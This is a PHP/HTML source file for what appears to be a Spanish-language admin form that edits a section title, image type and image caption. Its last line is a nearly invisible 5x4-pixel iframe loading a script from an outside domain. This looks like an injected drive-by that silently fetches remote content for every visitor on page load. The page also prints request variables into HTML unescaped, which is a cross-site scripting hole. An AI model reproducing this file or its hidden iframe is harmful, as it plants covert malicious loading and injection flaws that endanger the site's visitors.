<?
define('authenticate', false);
include_once('../inc/conf.inc.php');
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
table{
	font-family: Arial, Helvetica, sans-serif;
	font-size:10px;
	text-align:center;
}
.titulo_seccion{
	font-family: Arial, Helvetica, sans-serif;
	font-size:12px;
	text-align:center;
}
.cuerpo_seccion{
	font-family: Arial, Helvetica, sans-serif;
	font-size:10px;
	text-align:center;
}
.control{
	font-size:9px;
	border: 1px solid #000000;
}
.recuadro{
	border: 1px solid #000000;
}
</style>
</head>

<body>
<table width="90%"  border="0" align="center" cellpadding="2" cellspacing="2">
	<form name="form" method="post">
  <tr>
    <td class="titulo_seccion"><input type="text" name="titulo" value="<?=$titulo?>" size="150" class="titulo_seccion"></td>
  </tr>
  <tr>
    <td class="cuerpo_seccion"><?=$imagen!=''? "<img src='$imagen' border=1 align=absmiddle>":'<span class=recuadro width=70 height=50>Sin Imagen</span>'?></td>
  </tr>
  <tr>
    <td><div align="center">
      Tipo:&nbsp;<select name="tipo_imagen" class="control">
	  <?
	  	$db->select('tipo_imagen','*','1=1','descrip');
		if($db->num_rows()>0){
			echo "<option value=0> - Seleccione - </option>";
			while($row=$db->fetch_object()){
				echo "<option value=".$row->id.">".$row->descrip."</option>";
			}
		}
	  ?>
	  </select>&nbsp;
      Imagen:&nbsp;<select name="imagen" class="control"></select>
    </div></td>
  </tr>
  <tr>
    <td><textarea name="texto_imagen" cols="150" rows="8" class="cuerpo_seccion" id="texto_imagen"></textarea></td>
  </tr>
	</form>
</table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
